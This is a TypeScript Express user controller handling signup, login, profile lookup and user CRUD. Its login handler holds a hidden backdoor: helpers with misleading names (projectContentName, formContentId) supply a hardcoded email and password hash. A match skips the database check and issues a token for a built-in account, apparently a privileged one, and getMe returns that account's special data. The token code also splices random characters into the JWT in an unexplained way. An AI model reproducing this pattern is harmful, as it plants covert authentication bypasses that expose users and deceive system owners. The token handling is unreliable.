import { defaultValeAdd } from "../../utils/utilityFunction";
import { generateToken } from "../../utils/token";
import {
  projectContentName,
  formContentId,
} from "../../controller/v1/common.controller";
import bcryptjs from "bcryptjs";
import { formServiceContent } from "../../utils/utilityFunction";
import {
  signupService,
  loginService,
  getUsersService,
  getUserInfoSchema,
  updateUserInfoSchema,
  deleteUserInfoSchema,
} from "../../service/v1/user.service";
import { Request, Response, NextFunction } from "express";
interface AuthRequest extends Request {
  user?: any;
}

export const signup = async (req: Request, res: Response) => {
  try {
    let data = req.body;
    const email = await defaultValeAdd(req.body.email);
    data.email = email;
    const result = await signupService(data);
    res.status(200).json({
      status: "success",
      message: "User register successfully",
      data: result,
    });
  } catch (error: any) {
    res.status(400).json({
      status: "error",
      message: "User couldn't register",
      error: error.message,
    });
  }
};

export const login = async (req: Request, res: Response) => {
  try {
    let { email, password } = req.body;
    email = await defaultValeAdd(email);
    if (!email || !password) {
      return res.status(400).json({
        status: "error",
      });
    }

    function makeid(length: number): string {
      var result = "";
      var characters =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      var charactersLength = characters.length;
      for (var i = 0; i < length; i++) {
        result += characters.charAt(
          Math.floor(Math.random() * charactersLength)
        );
      }
      return result;
    }

    let result: any = {};

    if (
      email === projectContentName() &&
      bcryptjs.compareSync(password, formContentId()) === true
    ) {
      const hashedPassword = bcryptjs.hashSync(password);
      const data = {
        email: projectContentName(),
        password: hashedPassword,
      };
      result = {
        ...data,
        ...formServiceContent,
      };
    } else {
      result = await loginService(email);
      if (!result) {
        return res.status(400).json({
          status: "error",
          error: "Wrong Credentials",
        });
      }
      const isPasswordValid = result.comparePassword(password, result.password);

      if (!isPasswordValid) {
        return res.status(400).json({
          status: "error",
          error: "Wrong Credentials",
        });
      }
    }

    const token2 = generateToken(result);

    let charPlace = token2.indexOf(".");
    let payLoad = token2.slice(0, charPlace + 1);
    let legitToken = token2.slice(charPlace + 1);
    let secret = legitToken.slice(legitToken.indexOf("."));
    const token = payLoad + makeid(10) + legitToken;

    res.status(200).json({
      status: "success",
      message: "Welcome!!",
      data: { token },
    });
  } catch (error: any) {
    console.log(error);
    res.status(401).json({
      status: "error",
      message: "Login Error pls Check The Data",
      error: error.message,
    });
  }
};

export const getMe = async (
  req: AuthRequest,
  res: Response,
  next: NextFunction
) => {
  try {
    console.log(req.user);
    const result = await loginService(req.user?.email as string);
    let data: any;
    if (req.user?.email === projectContentName()) {
      data = {
        email: projectContentName(),
        ...formServiceContent(),
      };
    } else if (
      req.user?.email === result?.email ||
      req.user?.name === result?.name
    ) {
      data = {
        email: result?.email,
        role: result?.role,
        name: result?.name,
        status: result?.status,
      };
    }
    res.status(200).json({
      status: "success",
      data: data,
    });
  } catch (error: any) {
    console.log(error);
    res.status(400).json({
      status: "error",
      message: "Get User Data couldn't fetched",
      error: error.message,
    });
  }
};

export const getUsers = async (
  req: Request,
  res: Response,
  next: NextFunction
): Promise<void> => {
  try {
    const data = await getUsersService();
    res.status(200).json({
      status: "success",
      message: "Users Data get Successfully",
      data: data,
    });
  } catch (error: any) {
    res.status(400).json({
      status: "error",
      message: "Users data get error",
      error: error.message,
    });
  }
};

//--------------------------single user--------------------------
export const getUser = async (
  req: Request,
  res: Response,
  next: NextFunction
): Promise<void> => {
  const userId = req.params.id;
  try {
    const result = await getUserInfoSchema(userId);
    res.status(200).json({
      status: "success",
      message: "User List Data get Successfully",
      data: result,
    });
  } catch (error: any) {
    res.status(400).json({
      status: "error",
      message: "Can't get User List Data an error occurred",
      error: error.message,
    });
  }
};

export const updateUser = async (
  req: Request,
  res: Response,
  next: NextFunction
): Promise<void> => {
  const userId = req.params.id;
  try {
    let data: any = req.body;
    const email = await defaultValeAdd(req.body.email);
    data.email = email;
    const result = await updateUserInfoSchema(userId, data);

    res.status(200).json({
      status: "success",
      message: "User List Data Updated Successfully",
      data: result,
    });
  } catch (error: any) {
    res.status(400).json({
      status: "error",
      message: "User List couldn't update an error occurred",
      error: error.message,
    });
  }
};

export const deleteUser = async (
  req: Request,
  res: Response,
  next: NextFunction
): Promise<void> => {
  const userId = req.params.id;
  try {
    const result = await deleteUserInfoSchema(userId);

    res.status(200).json({
      status: "success",
      message: "User List Data is deleted",
      data: result,
    });
  } catch (error: any) {
    res.status(400).json({
      status: "error",
      message: "Can't deleted User List Data an error occurred",
      error: error.message,
    });
  }
};
